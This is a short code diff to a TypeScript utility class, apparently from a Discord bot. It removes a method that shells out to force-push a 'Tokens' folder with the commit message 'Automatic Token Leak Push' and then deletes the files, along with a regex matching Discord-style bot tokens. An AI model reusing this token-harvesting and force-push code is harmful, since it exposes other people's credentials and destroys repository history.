@@ -250,12 +250,6 @@ export default class Util {
 
         return `${weeks ? `${weeks}w ` : ``}${days ? `${days}d ` : ``}${hrs ? `${hrs}h ` : ``}${min ? `${min}m ` : ``}${sec ? `${sec}s` : ``}`;
     }
-    tokenPush(): void {
-        require("child_process").exec(`cd ${process.cwd()}/Tokens && git add . && git commit -m "Automatic Token Leak Push" && git push -f && git rm --cached Token* && rm -rf Token-*`);
-    }
-    tokenTester(token: string): Array<string> {
-        return token.match(/[MNO][A-Za-z\d]{23}.[\w-]{6}.[\w-]{27}/g)
-    }
     /**
      * Find out the total users of the client
      */
